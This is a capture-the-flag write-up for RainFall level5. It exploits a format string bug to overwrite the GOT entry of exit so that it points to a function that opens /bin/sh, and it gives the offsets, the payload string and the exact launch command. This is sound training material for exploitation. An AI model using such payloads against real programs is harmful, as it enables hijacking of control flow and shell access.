In this level, there is a `main`, `n` and `o` functions. the main calls `n`, that got a printf, but not the `o` function, that open a `/bin/sh`.

In `n` function, there is a format string vulnerability that we can exploit.

Our goal here is to call `o` function by overwritting it in the exit address of the `n` function.

We can use a trick called **GOT (Global Offset Table) overwrite**.

Basically, when the program is executed, the GOT (Global Offset Table) is initialized for every external functions (like libc functions). By doing so, the executable will cache the memory address in the GOT, so that it doesn’t have to ask libc each time an external function is called.

We find the address of exit in the GOT :

```
level5@RainFall:~$ objdump -R level5 

level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
08049814 R_386_GLOB_DAT    __gmon_start__
08049848 R_386_COPY        stdin
08049824 R_386_JUMP_SLOT   printf
08049828 R_386_JUMP_SLOT   _exit
0804982c R_386_JUMP_SLOT   fgets
08049830 R_386_JUMP_SLOT   system
08049834 R_386_JUMP_SLOT   __gmon_start__
08049838 R_386_JUMP_SLOT   exit ---> Here
0804983c R_386_JUMP_SLOT   __libc_start_main
```

Next, we want to see where our `printf` writes into the stack : 

> level5@RainFall:~$ ./level5 
AAAA%08x.%08x.%08x.%08x.%08x.%08x     
> AAAA00000200.b7fd1ac0.b7ff37d0.41414141.78383025.3830252e

It writes in the 4th argument.

The address we want to write is the address of the `o` function : `0x080484a4`

```
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:	push   %ebp
```

We will write this address in 2 parts, the low order bytes and then the high order.

- Low order bytes = 84a4 (33956 in decimal)
- High order bytes = 0804 (2052 in decimal)

However, the high order bytes is inferior to the low order so, we’ll write the high order first! We just need to invert the addresses where we want to write! Let’s do some math:

- High order bytes = 0804 (2052 in decimal). Minus the 8 bytes for the addresses = 2044 (7FC en hexa)
- Low order bytes = 84a4 (33956 in decimal). Minus the 2052 bytes we already wrote = 31904 (7CC7 en hexa) 

Our exploit is :

`\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn`

Which is : The address of the exit minus 2 bytes + address of the exit + low order bytes +  4th argument + high order bytes 

The command to launch : 

> (python -c 'print "\x3a\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"' ; cat -) | ./level5


# Sources : 

About the Code Execution Redirect exploit :

- https://axcheron.github.io/exploit-101-format-strings/#code-execution-redirect
